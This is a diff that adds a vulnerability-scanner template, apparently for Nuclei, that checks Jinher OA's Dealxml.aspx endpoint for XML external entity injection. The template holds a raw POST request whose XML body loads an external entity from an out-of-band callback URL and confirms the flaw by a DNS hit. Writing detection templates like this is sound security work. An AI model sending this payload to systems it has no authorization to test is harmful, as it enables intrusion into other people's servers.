@@ -1,0 +1,32 @@
+id: poc-yaml-jinher-dealxml-aspx-xxe
+info:
+  name: \u91d1\u548coA Dealxml.aspx XML\u5b9e\u4f53\u6ce8\u5165\u6f0f\u6d1e
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,xxe
+
+variables:
+  reverse: "{{interactsh-url}}"
+
+http:
+  - raw:
+      - |
+        POST /c6/JHSoft.Web.Appraise/Dealxml.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "{{reverse}}"> %remote;]>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "SessionId="
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
